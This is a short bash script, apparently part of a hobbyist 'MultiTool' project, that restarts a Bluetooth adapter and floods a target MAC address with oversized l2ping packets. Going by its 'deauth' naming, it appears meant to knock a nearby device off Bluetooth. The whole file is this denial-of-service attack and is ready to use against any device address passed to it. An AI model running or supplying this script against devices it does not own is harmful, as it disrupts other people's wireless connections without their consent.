#!/bin/bash

LOG_DIR="/home/adamfitz395/Documents/GitHub/MultiTool-Project/Code/logfiles/btlogs"
PID_FILE="$LOG_DIR/deauth.pid"
MAC=$1

sudo hciconfig hci0 down
sudo hciconfig hci0 up

sudo l2ping -i hci0 -s 666 -f $MAC